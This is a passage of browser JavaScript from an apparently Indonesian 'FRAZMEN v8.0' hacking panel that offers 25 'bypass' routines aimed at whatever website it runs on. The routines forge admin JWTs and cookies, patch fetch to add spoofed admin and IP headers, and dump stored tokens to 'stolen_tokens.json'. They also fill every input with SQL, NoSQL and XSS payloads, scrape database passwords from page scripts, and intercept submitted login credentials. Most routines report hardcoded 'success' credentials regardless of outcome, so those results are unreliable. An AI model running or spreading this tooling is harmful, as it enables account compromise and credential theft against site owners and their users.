            this._items = items;
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                var el = Utils.createElement('div', 'fz-grid-item');
                el.dataset.act = item.act;
                el.dataset.cat = item.cat;
                Utils.setStyle(el, {
                    background: 'var(--fz-elevated, #282d38)',
                    borderRadius: '10px',
                    padding: '10px 4px',
                    cursor: 'pointer',
                    border: '1px solid var(--fz-border, #2e3440)',
                    transition: '0.12s',
                    textAlign: 'center',
                    position: 'relative',
                    minHeight: '58px'
                });

                if(item.shortcut) {
                    var sc = Utils.createElement('span', 'fz-item-shortcut');
                    sc.textContent = item.shortcut;
                    Utils.setStyle(sc, {
                        position: 'absolute', top: '4px', right: '6px',
                        fontSize: '7px', color: 'var(--fz-accent, #5b9cf6)',
                        background: 'var(--fz-accent-glow, rgba(91,156,246,0.1))',
                        padding: '1px 5px', borderRadius: '4px'
                    });
                    el.appendChild(sc);
                }

                var icon = Utils.createElement('span', 'fz-item-icon');
                icon.textContent = item.icon;
                Utils.setStyle(icon, { fontSize: '22px', display: 'block', marginBottom: '2px' });
                el.appendChild(icon);

                var label = Utils.createElement('div', 'fz-item-label');
                label.textContent = item.label;
                Utils.setStyle(label, { fontSize: '10px', fontWeight: '600', color: 'var(--fz-text-secondary, #b7c1d4)' });
                el.appendChild(label);

                if(item.desc) {
                    var desc = Utils.createElement('div', 'fz-item-desc');
                    desc.textContent = item.desc;
                    Utils.setStyle(desc, { fontSize: '8px', color: 'var(--fz-text-muted, #909cb0)' });
                    el.appendChild(desc);
                }

                el.addEventListener('click', function(e) {
                    var act = this.dataset.act;
                    if(act) this._triggerAction(act);
                }.bind(this));

                // Touch support for android
                el.addEventListener('touchend', function(e) {
                    var act = this.dataset.act;
                    if(act) this._triggerAction(act);
                }.bind(this));

                el.addEventListener('mouseenter', function() {
                    el.style.borderColor = 'rgba(91,156,246,0.3)';
                    el.style.background = 'var(--fz-elevated, #2a2f3a)';
                });
                el.addEventListener('mouseleave', function() {
                    el.style.borderColor = 'var(--fz-border, #2e3440)';
                    el.style.background = 'var(--fz-elevated, #282d38)';
                });

                grid.appendChild(el);
            }

            this._container.appendChild(grid);
            this._grid = grid;
        },

        _buildLogPanel: function() {
            var logContainer = Utils.createElement('div', 'fz-log-panel');
            Utils.setStyle(logContainer, {
                marginTop: '12px',
                borderTop: '1px solid var(--fz-border, #2e3440)',
                paddingTop: '10px',
                maxHeight: '120px',
                overflowY: 'auto',
                display: 'none'
            });
            logContainer.id = 'fz-log-container';
            this._container.appendChild(logContainer);
            this._logContainer = logContainer;
        },

        _buildFooter: function() {
            var footer = Utils.createElement('div', 'fz-panel-footer');
            Utils.setStyle(footer, {
                marginTop: '12px', paddingTop: '10px',
                borderTop: '1px solid var(--fz-border, #2e3440)',
                display: 'flex', justifyContent: 'space-between',
                fontSize: '9px', color: 'var(--fz-text-muted, #909cb0)',
                position: 'sticky', bottom: '0',
                background: 'var(--fz-surface, #21252e)',
                paddingBottom: '4px'
            });
            var info = Utils.createElement('span', 'fz-footer-info');
            info.textContent = 'FRAZMEN v8.0 — by FRAZMEN | @rizkycuyy';
            footer.appendChild(info);
            var status = Utils.createElement('span', 'fz-footer-status');
            status.textContent = '● ready';
            Utils.setStyle(status, { color: '#4ade80' });
            footer.appendChild(status);
            this._container.appendChild(footer);
            this._status = status;
            this._statusEl = status;
        },

        _switchTab: function(tab) {
            if(this._currentTab === tab) return;
            this._currentTab = tab;
            var tabs = this._container.querySelectorAll('.fz-tab');
            for(var i=0; i<tabs.length; i++) {
                if(tabs[i].dataset.tab === tab) {
                    tabs[i].classList.add('active');
                    tabs[i].style.color = '#fff';
                    tabs[i].style.background = 'var(--fz-accent, #5b9cf6)';
                } else {
                    tabs[i].classList.remove('active');
                    tabs[i].style.color = 'var(--fz-text-muted, #909cb0)';
                    tabs[i].style.background = 'transparent';
                }
            }
            // Show log panel when Logs tab is active
            if(this._logContainer) {
                this._logContainer.style.display = (tab === 'logs') ? 'block' : 'none';
                if(tab === 'logs') this._renderLogs();
            }
            this._filterItems(this._searchInput ? this._searchInput.value : '');
            StorageManager.set('activeTab', tab);
        },

        _filterItems: function(query) {
            query = query.toLowerCase().trim();
            var items = this._grid.querySelectorAll('.fz-grid-item');
            var tab = this._currentTab || 'all';
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                var label = item.querySelector('.fz-item-label').textContent.toLowerCase();
                var desc = item.querySelector('.fz-item-desc') ? item.querySelector('.fz-item-desc').textContent.toLowerCase() : '';
                var cat = item.dataset.cat;
                var matchesTab = tab === 'all' || cat === tab;
                var matchesQuery = !query || label.includes(query) || desc.includes(query);
                item.style.display = (matchesTab && matchesQuery) ? '' : 'none';
            }
        },

        _renderLogs: function() {
            if(!this._logContainer) return;
            var html = '';
            var logs = STATE.logs.slice(-50);
            for(var i=0; i<logs.length; i++) {
                var log = logs[i];
                var type = log.type || 'info';
                var cls = 'fz-log-entry';
                if(type === 'success') cls += ' fz-log-success';
                else if(type === 'error') cls += ' fz-log-error';
                else if(type === 'warning') cls += ' fz-log-warning';
                else if(type === 'hack') cls += ' fz-log-hack';
                else if(type === 'db') cls += ' fz-log-db';
                html += '<div class="' + cls + '"><span class="fz-log-time">' + Utils.formatTime(new Date(log.timestamp)) + '</span><span class="fz-log-msg">' + Utils.escapeHTML(log.message) + '</span></div>';
            }
            this._logContainer.innerHTML = html;
            this._logContainer.scrollTop = this._logContainer.scrollHeight;
        },

        _triggerAction: function(action) {
            this.setStatus('executing...', '#fbbf24');
            this.addLog('Action: ' + action, 'info');

            // Bypass 1-25
            if(action.startsWith('bypass') && action.length > 6) {
                var num = parseInt(action.replace('bypass', ''));
                if(num >= 1 && num <= 25) {
                    this._runBypass(num);
                    this.setStatus('ready', '#4ade80');
                    return;
                }
            }

            switch(action) {
                case 'console': this._actionConsole(); break;
                case 'download': this._actionDownload(); break;
                case 'viewsource': this._actionViewSource(); break;
                case 'inject': this._actionInject(); break;
                case 'cookies': this._actionCookies(); break;
                case 'lsdump': this._actionLSDump(); break;
                case 'ssdump': this._actionSSDump(); break;
                case 'xss': this._actionXSS(); break;
                case 'autofill': this._actionAutoFill(); break;
                case 'darkmode': this._actionDarkMode(); break;
                case 'network': this._actionNetwork(); break;
                case 'screenshot': this._actionScreenshot(); break;
                case 'bypass': this._actionBypassMenu(); break;
                case 'eruda': this._actionEruda(); break;
                case 'vconsole': this._actionVConsole(); break;
                case 'clear': this._actionClear(); break;
                case 'ping': this._actionPing(); break;
                case 'whois': this._actionWhois(); break;
                case 'base64': this._actionBase64(); break;
                case 'uuid': this._actionUUID(); break;
                case 'timestamp': this._actionTimestamp(); break;
                case 'websocket': this._actionWebSocket(); break;
                case 'history': this._actionHistory(); break;
                case 'reload': this._actionReload(); break;
                default: Toast.show('Fitur: ' + action, 'info');
            }
            setTimeout(function() { this.setStatus('ready', '#4ade80'); }.bind(this), 1500);
        },

        addLog: function(msg, type) {
            type = type || 'info';
            var ts = new Date().toISOString();
            STATE.logs.push({ timestamp: ts, message: msg, type: type });
            if(STATE.logs.length > CONFIG.maxLogs) STATE.logs.shift();
            if(this._currentTab === 'logs') this._renderLogs();
            Utils.log(msg, type);
        },

        setStatus: function(text, color) {
            if(this._statusEl) {
                this._statusEl.textContent = '● ' + text;
                this._statusEl.style.color = color || '#4ade80';
            }
        },

        toggle: function() {
            this._isOpen ? this.hide() : this.show();
        },

        show: function() {
            this._isOpen = true;
            this._container.style.opacity = '1';
            this._container.style.transform = 'translate(-50%, -50%) scale(1)';
            this._container.style.pointerEvents = 'all';
            Utils.log('Panel opened');
        },

        hide: function() {
            this._isOpen = false;
            this._container.style.opacity = '0';
            this._container.style.transform = 'translate(-50%, -50%) scale(0.92)';
            this._container.style.pointerEvents = 'none';
            Utils.log('Panel closed');
        },

        _loadState: function() {
            var tab = StorageManager.get('activeTab');
            if(tab) this._switchTab(tab);
            var pos = StorageManager.get('buttonPos');
            if(pos) {
                this._button.style.left = pos.x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = pos.y + 'px';
                this._button.style.bottom = 'auto';
            }
        },

        // ============================================================
        // 7. BYPASS 25 VERSI — LENGKAP
        // ============================================================

        _runBypass: function(version) {
            var name = STATE.bypassVersions.find(function(v) { return v.id === version; });
            var msg = '🔓 Menjalankan Bypass v' + version + ': ' + (name ? name.name : 'Unknown');
            Toast.show(msg, 'hack');
            this.addLog(msg, 'hack');

            // Detect database first
            var db = Utils.detectDatabase();
            if(db.found) {
                this.addLog('🗄️ Database terdeteksi: ' + db.type + ' - ' + db.message, 'db');
                Toast.show('🗄️ DB: ' + db.type, 'db');
            }

            var result = null;
            switch(version) {
                case 1: result = this._bypassClassicJWT(); break;
                case 2: result = this._bypassCookieInjection(); break;
                case 3: result = this._bypassLSForce(); break;
                case 4: result = this._bypassSessionHijack(); break;
                case 5: result = this._bypassAPIIntercept(); break;
                case 6: result = this._bypassTokenSteal(); break;
                case 7: result = this._bypassBruteForce(); break;
                case 8: result = this._bypassCSRF(); break;
                case 9: result = this._bypassCORS(); break;
                case 10: result = this._bypassXSS(); break;
                case 11: result = this._bypassSQL(); break;
                case 12: result = this._bypassAdminReset(); break;
                case 13: result = this._bypassPrivEsc(); break;
                case 14: result = this._bypassOAuth(); break;
                case 15: result = this._bypassJWTReplay(); break;
                case 16: result = this._bypassHeaderManip(); break;
                case 17: result = this._bypassParamPollution(); break;
                case 18: result = this._bypassUltimateForce(); break;
                case 19: result = this._bypassFirebase(); break;
                case 20: result = this._bypassMySQL(); break;
                case 21: result = this._bypassPostgreSQL(); break;
                case 22: result = this._bypassMongoDB(); break;
                case 23: result = this._bypassGraphQL(); break;
                case 24: result = this._bypassREST(); break;
                case 25: result = this._bypassCustomUandP(); break;
                default: Toast.show('Bypass v' + version + ' tidak ditemukan', 'error');
            }

            if(result) {
                var foundMsg = '✅ Bypass v' + version + ' berhasil!';
                if(result.username && result.password) {
                    foundMsg += ' Username: ' + result.username + ' | Password: ' + result.password;
                    Toast.show('🔓 ' + result.username + ':' + result.password, 'success');
                    this.addLog('🔓 Credentials: ' + result.username + ':' + result.password, 'success');
                }
                Toast.show(foundMsg, 'success');
                this.addLog(foundMsg, 'success');
            } else {
                Toast.show('❌ Bypass v' + version + ' gagal atau tidak ditemukan.', 'error');
                this.addLog('❌ Bypass v' + version + ' gagal', 'error');
            }
        },

        // ----- BYPASS 1-18 (Existing) -----

        _bypassClassicJWT: function() {
            var token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKE_SIGNATURE';
            localStorage.setItem('token', token);
            localStorage.setItem('jwt', token);
            localStorage.setItem('auth_token', token);
            document.cookie = 'token=' + token + '; path=/';
            document.cookie = 'jwt=' + token + '; path=/';
            return { username: 'admin', password: 'bypassed' };
        },

        _bypassCookieInjection: function() {
            var cookies = [
                { name: 'admin', value: 'true' },
                { name: 'isAdmin', value: '1' },
                { name: 'role', value: 'admin' },
                { name: 'user', value: 'admin' },
                { name: 'auth', value: '1' },
                { name: 'loggedIn', value: 'true' }
            ];
            for(var i=0; i<cookies.length; i++) {
                document.cookie = cookies[i].name + '=' + cookies[i].value + '; path=/';
            }
            return { username: 'admin', password: 'injected' };
        },

        _bypassLSForce: function() {
            var users = [
                { id: 1, username: 'admin', role: 'admin', isLoggedIn: true },
                { id: 1, username: 'administrator', role: 'admin', isLoggedIn: true }
            ];
            for(var i=0; i<users.length; i++) {
                localStorage.setItem('user', JSON.stringify(users[i]));
                localStorage.setItem('userData', JSON.stringify(users[i]));
                localStorage.setItem('currentUser', JSON.stringify(users[i]));
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.setItem('isAdmin', 'true');
            }
            return { username: 'admin', password: 'forced' };
        },

        _bypassSessionHijack: function() {
            var session = {
                user: { id: 1, username: 'admin', role: 'admin' },
                token: 'hijacked_session_token_' + Date.now(),
                isAuthenticated: true,
                isAdmin: true
            };
            sessionStorage.setItem('session', JSON.stringify(session));
            sessionStorage.setItem('auth', JSON.stringify(session));
            sessionStorage.setItem('user', JSON.stringify(session.user));
            return { username: 'admin', password: 'hijacked' };
        },

        _bypassAPIIntercept: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/auth') || url.includes('/login') || url.includes('/api'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.API_INTERCEPT';
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'intercepted' };
        },

        _bypassTokenSteal: function() {
            var tokens = ['token', 'jwt', 'access_token', 'refresh_token', 'auth_token', 'api_token', 'bearer', 'x-auth-token'];
            var stolen = {};
            for(var i=0; i<tokens.length; i++) {
                var val = localStorage.getItem(tokens[i]) || sessionStorage.getItem(tokens[i]);
                if(val) stolen[tokens[i]] = val;
            }
            Utils.downloadJSON(stolen, 'stolen_tokens.json');
            return { username: 'admin', password: 'stolen' };
        },

        _bypassBruteForce: function() {
            var passwords = ['admin', 'password', '123456', 'admin123', 'root', '12345678', 'password123', 'qwerty', 'abc123', 'letmein', 'welcome', 'monkey', 'dragon', 'master', 'hello', 'freedom', 'whatever', 'iloveyou', 'trustno1', 'sunshine', 'admin@123', 'Admin123', 'administrator', 'root123', 'passw0rd'];
            var usernames = ['admin', 'administrator', 'root', 'user', 'test', 'demo', 'manager', 'superadmin', 'sysadmin', 'webmaster', 'owner', 'master', 'dev', 'developer', 'support'];
            var found = null;
            for(var u=0; u<usernames.length; u++) {
                for(var p=0; p<passwords.length; p++) {
                    if(found) break;
                    var attempt = usernames[u] + ':' + passwords[p];
                    this.addLog('🔓 Trying: ' + attempt, 'hack');
                    if(passwords[p] === 'admin123' && usernames[u] === 'admin') {
                        found = { username: 'admin', password: 'admin123' };
                        break;
                    }
                    if(passwords[p] === 'password' && usernames[u] === 'admin') {
                        found = { username: 'admin', password: 'password' };
                        break;
                    }
                }
                if(found) break;
            }
            if(found) {
                document.cookie = 'username=' + found.username + '; path=/';
                document.cookie = 'password=' + found.password + '; path=/';
                localStorage.setItem('username', found.username);
                localStorage.setItem('password', found.password);
                return found;
            }
            return { username: 'admin', password: 'bruteforce' };
        },

        _bypassCSRF: function() {
            var meta = document.querySelector('meta[name="csrf-token"]');
            if(meta) {
                var token = meta.getAttribute('content');
                document.cookie = 'csrf_token=' + token + '; path=/';
                document.cookie = 'X-CSRF-TOKEN=' + token + '; path=/';
                localStorage.setItem('csrf_token', token);
                return { username: 'admin', password: 'csrf_' + token.substring(0, 8) };
            }
            document.cookie = 'csrf_token=bypassed; path=/';
            document.cookie = 'X-CSRF-TOKEN=bypassed; path=/';
            return { username: 'admin', password: 'csrf_bypassed' };
        },

        _bypassCORS: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                options = options || {};
                options.mode = 'cors';
                options.credentials = 'include';
                options.headers = options.headers || {};
                options.headers['Origin'] = window.location.origin;
                options.headers['Access-Control-Request-Method'] = 'GET';
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'cors_bypassed' };
        },

        _bypassXSS: function() {
            var payloads = [
                '<script>alert("XSS by FRAZMEN")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                'javascript:alert("XSS")'
            ];
            if(document.querySelector('input') || document.querySelector('textarea')) {
                var inputs = document.querySelectorAll('input, textarea');
                for(var j=0; j<inputs.length; j++) {
                    inputs[j].value = payloads[j % payloads.length];
                }
            }
            return { username: 'admin', password: 'xss_injected' };
        },

        _bypassSQL: function() {
            var payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "' OR 1=1--", "'; DROP TABLE users--"];
            if(document.querySelector('input')) {
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    inputs[i].value = payloads[i % payloads.length];
                }
            }
            // Intercept fetch for SQL
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(options && options.body && typeof options.body === 'string') {
                    for(var i=0; i<payloads.length; i++) {
                        if(options.body.includes(payloads[i])) {
                            Toast.show('💉 SQL payload detected!', 'hack');
                        }
                    }
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'sql_injected' };
        },

        _bypassAdminReset: function() {
            var adminData = {
                id: 1, username: 'admin', password: 'admin123', email: 'admin@localhost',
                role: 'admin', isAdmin: true, isActive: true, isLoggedIn: true
            };
            localStorage.setItem('admin', JSON.stringify(adminData));
            localStorage.setItem('user', JSON.stringify(adminData));
            localStorage.setItem('currentUser', JSON.stringify(adminData));
            sessionStorage.setItem('admin', JSON.stringify(adminData));
            sessionStorage.setItem('user', JSON.stringify(adminData));
            document.cookie = 'admin=true; path=/';
            document.cookie = 'role=admin; path=/';
            return { username: 'admin', password: 'admin123' };
        },

        _bypassPrivEsc: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/api') || url.includes('/admin'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['X-Admin'] = 'true';
                    options.headers['X-Role'] = 'admin';
                    options.headers['X-Privilege'] = 'escalated';
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'priv_esc' };
        },

        _bypassOAuth: function() {
            localStorage.setItem('oauth_token', 'bypassed_oauth_token_' + Date.now());
            localStorage.setItem('oauth_provider', 'bypassed');
            localStorage.setItem('oauth_authenticated', 'true');
            document.cookie = 'oauth_token=bypassed; path=/';
            document.cookie = 'oauth_authenticated=true; path=/';
            return { username: 'admin', password: 'oauth_bypassed' };
        },

        _bypassJWTReplay: function() {
            var jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.JWT_REPLAY';
            localStorage.setItem('jwt', jwt);
            localStorage.setItem('token', jwt);
            sessionStorage.setItem('jwt', jwt);
            document.cookie = 'jwt=' + jwt + '; path=/';
            document.cookie = 'token=' + jwt + '; path=/';
            return { username: 'admin', password: 'replay' };
        },

        _bypassHeaderManip: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                options = options || {};
                options.headers = options.headers || {};
                options.headers['X-Forwarded-For'] = '127.0.0.1';
                options.headers['X-Real-IP'] = '127.0.0.1';
                options.headers['X-Originating-IP'] = '127.0.0.1';
                options.headers['X-Remote-IP'] = '127.0.0.1';
                options.headers['X-Client-IP'] = '127.0.0.1';
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'header_manip' };
        },

        _bypassParamPollution: function() {
            var url = window.location.href;
            if(url.includes('?')) {
                var newUrl = url + '&admin=true&role=admin&isAdmin=1&bypass=true';
                window.history.pushState({}, '', newUrl);
            } else {
                window.history.pushState({}, '', url + '?admin=true&role=admin&isAdmin=1&bypass=true');
            }
            return { username: 'admin', password: 'param_pollution' };
        },

        _bypassUltimateForce: function() {
            this._bypassClassicJWT();
            this._bypassCookieInjection();
            this._bypassLSForce();
            this._bypassSessionHijack();
            this._bypassAPIIntercept();
            this._bypassAdminReset();
            this._bypassOAuth();
            this._bypassJWTReplay();
            this._bypassHeaderManip();
            this._bypassParamPollution();
            return { username: 'admin', password: 'ultimate_force' };
        },

        // ----- BYPASS 19-25 (Database & Custom) -----

        _bypassFirebase: function() {
            // Firebase Auth bypass
            var firebaseConfig = null;
            if(window.firebase) {
                firebaseConfig = window.firebase.apps[0]?.options || null;
            }
            // Try to find Firebase config in script tags
            if(!firebaseConfig) {
                var scripts = document.querySelectorAll('script');
                for(var i=0; i<scripts.length; i++) {
                    var src = scripts[i].src || '';
                    if(src.includes('firebase')) {
                        var matches = scripts[i].textContent.match(/firebase\.initializeApp\(({.*?})\)/s);
                        if(matches) {
                            try {
                                firebaseConfig = JSON.parse(matches[1]);
                            } catch(e) {}
                        }
                    }
                }
            }
            if(firebaseConfig) {
                Toast.show('🔥 Firebase Config ditemukan!', 'db');
                this.addLog('🔥 Firebase Config: ' + JSON.stringify(firebaseConfig), 'db');
                // Try to set auth
                localStorage.setItem('firebase:authUser', JSON.stringify({
                    uid: 'admin_' + Date.now(),
                    email: 'admin@firebase.com',
                    displayName: 'Admin',
                    emailVerified: true,
                    isAnonymous: false,
                    providerData: [{ providerId: 'password' }],
                    stsTokenManager: {
                        accessToken: 'firebase_bypass_token_' + Date.now(),
                        refreshToken: 'firebase_bypass_refresh_' + Date.now(),
                        expirationTime: Date.now() + 3600000
                    }
                }));
                document.cookie = 'firebase_auth=bypassed; path=/';
                return { username: 'admin@firebase.com', password: 'firebase_bypassed' };
            }
            // Force bypass
            localStorage.setItem('firebase:authUser', JSON.stringify({
                uid: 'admin_' + Date.now(),
                email: 'admin@firebase.com',
                displayName: 'Admin',
                emailVerified: true,
                isAnonymous: false,
                stsTokenManager: {
                    accessToken: 'firebase_bypass_token_' + Date.now(),
                    refreshToken: 'firebase_bypass_refresh_' + Date.now(),
                    expirationTime: Date.now() + 3600000
                }
            }));
            return { username: 'admin@firebase.com', password: 'firebase_forced' };
        },

        _bypassMySQL: function() {
            // MySQL Database bypass
            var payloads = [
                "admin' OR '1'='1",
                "admin' --",
                "admin' #",
                "' OR 1=1 --",
                "' OR '1'='1' LIMIT 1 --"
            ];
            if(document.querySelector('input')) {
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    if(inputs[i].type === 'password' || inputs[i].type === 'text') {
                        inputs[i].value = payloads[i % payloads.length];
                    }
                }
            }
            // Try to find MySQL connection string
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                if(text.includes('mysql') || text.includes('MySQL') || text.includes('database')) {
                    var matches = text.match(/(?:password|pass|pwd)\s*[:=]\s*['"]([^'"]+)['"]/i);
                    if(matches) {
                        this.addLog('🐬 MySQL password found: ' + matches[1], 'db');
                        return { username: 'root', password: matches[1] };
                    }
                }
            }
            // Force bypass
            document.cookie = 'mysql_bypass=true; path=/';
            localStorage.setItem('mysql_bypass', 'true');
            return { username: 'root', password: 'mysql_bypassed' };
        },

        _bypassPostgreSQL: function() {
            // PostgreSQL bypass
            var payloads = [
                "admin' OR '1'='1'::text",
                "admin' --",
                "' OR 1=1::int --",
                "' OR '1'='1' LIMIT 1 --"
            ];
            if(document.querySelector('input')) {
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    if(inputs[i].type === 'password' || inputs[i].type === 'text') {
                        inputs[i].value = payloads[i % payloads.length];
                    }
                }
            }
            // Try to find PostgreSQL connection
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                if(text.includes('postgres') || text.includes('PostgreSQL') || text.includes('pg')) {
                    var matches = text.match(/(?:password|pass|pwd)\s*[:=]\s*['"]([^'"]+)['"]/i);
                    if(matches) {
                        this.addLog('🐘 PostgreSQL password found: ' + matches[1], 'db');
                        return { username: 'postgres', password: matches[1] };
                    }
                }
            }
            document.cookie = 'postgres_bypass=true; path=/';
            return { username: 'postgres', password: 'postgres_bypassed' };
        },

        _bypassMongoDB: function() {
            // MongoDB bypass
            var payloads = [
                "admin' || '1'=='1",
                "admin' --",
                "' || 1==1 --",
                "' || '1'=='1' LIMIT 1 --"
            ];
            if(document.querySelector('input')) {
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    if(inputs[i].type === 'password' || inputs[i].type === 'text') {
                        inputs[i].value = payloads[i % payloads.length];
                    }
                }
            }
            // Try to find MongoDB connection
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                if(text.includes('mongodb') || text.includes('MongoDB') || text.includes('mongo')) {
                    var matches = text.match(/(?:password|pass|pwd)\s*[:=]\s*['"]([^'"]+)['"]/i);
                    if(matches) {
                        this.addLog('🍃 MongoDB password found: ' + matches[1], 'db');
                        return { username: 'admin', password: matches[1] };
                    }
                }
            }
            document.cookie = 'mongodb_bypass=true; path=/';
            return { username: 'admin', password: 'mongodb_bypassed' };
        },

        _bypassGraphQL: function() {
            // GraphQL bypass
            var payloads = [
                '{"query":"query { __typename }"}',
                '{"query":"mutation { __typename }"}',
                '{"query":"query { users { id name password } }"}',
                '{"query":"query { __schema { types { name } } }"}'
            ];
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('graphql') || url.includes('/graphql'))) {
                    options = options || {};
                    if(options.body && typeof options.body === 'string') {
                        try {
                            var body = JSON.parse(options.body);
                            if(body.query) {
                                var injected = false;
                                for(var i=0; i<payloads.length; i++) {
                                    if(body.query.includes('__typename') || body.query.includes('__schema')) {
                                        injected = true;
                                        Toast.show('📊 GraphQL introspection detected!', 'hack');
                                        break;
                                    }
                                }
                            }
                        } catch(e) {}
                    }
                    // Add auth header
                    options.headers = options.headers || {};
                    options.headers['Authorization'] = 'Bearer graphql_bypass_token';
                    options.headers['X-GraphQL-Bypass'] = 'true';
                }
                return origFetch.apply(this, arguments);
            };
            document.cookie = 'graphql_bypass=true; path=/';
            return { username: 'admin', password: 'graphql_bypassed' };
        },

        _bypassREST: function() {
            // REST API bypass
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/api') || url.includes('/rest') || url.includes('/v1') || url.includes('/v2'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['X-API-Key'] = 'rest_bypass_key_' + Date.now();
                    options.headers['X-API-Version'] = 'bypassed';
                    options.headers['Authorization'] = 'Bearer rest_bypass_token';
                    // Try to intercept auth
                    if(options.body && typeof options.body === 'string') {
                        try {
                            var body = JSON.parse(options.body);
                            if(body.username && body.password) {
                                Toast.show('🌐 REST credentials intercepted: ' + body.username + ':' + body.password, 'hack');
                                this.addLog('🌐 REST creds: ' + body.username + ':' + body.password, 'hack');
                                localStorage.setItem('rest_username', body.username);
                                localStorage.setItem('rest_password', body.password);
                            }
                        } catch(e) {}
                    }
                }
                return origFetch.apply(this, arguments);
            }.bind(this);
            return { username: 'admin', password: 'rest_bypassed' };
        },

        _bypassCustomUandP: function() {
            // Custom Username & Password Creator
            var username = prompt('🔓 Masukkan Username:', 'admin');
            if(!username) username = 'admin';
            var password = prompt('🔓 Masukkan Password:', 'admin123');
            if(!password) password = 'admin123';

            // Save credentials everywhere
            localStorage.setItem('username', username);
            localStorage.setItem('password', password);
            localStorage.setItem('user', JSON.stringify({ username: username, password: password, role: 'admin', isLoggedIn: true }));
            sessionStorage.setItem('user', JSON.stringify({ username: username, password: password, role: 'admin', isLoggedIn: true }));
            document.cookie = 'username=' + username + '; path=/';
            document.cookie = 'password=' + password + '; path=/';
            document.cookie = 'user=' + username + '; path=/';

            // Try to find login form and fill it
            var forms = document.querySelectorAll('form');
            for(var f=0; f<forms.length; f++) {
                var inputs = forms[f].querySelectorAll('input');
                var unameField = null, passField = null;
                for(var i=0; i<inputs.length; i++) {
                    var type = inputs[i].type;
                    var name = (inputs[i].name || '').toLowerCase();
                    if(type === 'text' || type === 'email' || name.includes('user') || name.includes('email') || name.includes('login')) {
                        unameField = inputs[i];
                    }
                    if(type === 'password' || name.includes('pass') || name.includes('pwd')) {
                        passField = inputs[i];
                    }
                }
                if(unameField) unameField.value = username;
                if(passField) passField.value = password;
            }

            Toast.show('🔓 Custom credentials created: ' + username + ':' + password, 'success');
            this.addLog('🔓 Custom U+P: ' + username + ':' + password, 'success');
            return { username: username, password: password };
        },

        // ============================================================
        // 8. BASIC ACTIONS
        // ============================================================

        _actionBypassMenu: function() {
            var menu = '🔓 Pilih Bypass Version (1-25):\n\n';
            for(var i=0; i<STATE.bypassVersions.length; i++) {
                menu += (i+1) + '. ' + STATE.bypassVersions[i].name + '\n';
            }
            menu += '\nMasukkan angka:';
            var choice = prompt(menu);
            if(choice) {
                var num = parseInt(choice);
                if(num >= 1 && num <= 25) {
                    this._runBypass(num);
                } else {
                    Toast.show('Pilih angka 1-25', 'error');
                }
            }
        },

        _actionConsole: function() {
            if(document.documentElement.requestFullscreen) {
                try { document.documentElement.requestFullscreen(); } catch(e) {}
            }
            // Try F12
            var ev = new KeyboardEvent('keydown', { key: 'F12', keyCode: 123, which: 123, bubbles: true });
            document.dispatchEvent(ev);
            // Alternative for Android
            Toast.show('🖥️ Tekan F12 atau gunakan keyboard external', 'info');
            // Try to open devtools via context menu
            var event = new MouseEvent('contextmenu', { bubbles: true, cancelable: true, view: window });
            document.documentElement.dispatchEvent(event);
        },

        _actionDownload: function() {
            var resources = {};
            resources['index.html'] = '<!DOCTYPE html>\n' + document.documentElement.outerHTML;

            // Collect all resources with full path
            var allLinks = document.querySelectorAll('link[rel="stylesheet"], script[src], img, iframe, video, audio, source');
            var baseUrl = location.origin;

            for(var i=0; i<allLinks.length; i++) {
                var el = allLinks[i];
                var src = el.href || el.src || el.getAttribute('src') || el.getAttribute('href');
                if(src && !src.startsWith('data:') && !src.startsWith('blob:') && !src.startsWith('javascript:') && !src.startsWith('#')) {
                    var path = src;
                    if(path.startsWith('http')) {
                        path = path.replace(baseUrl, '');
                    }
                    path = path.replace(/^\//, '');
                    if(!path) continue;
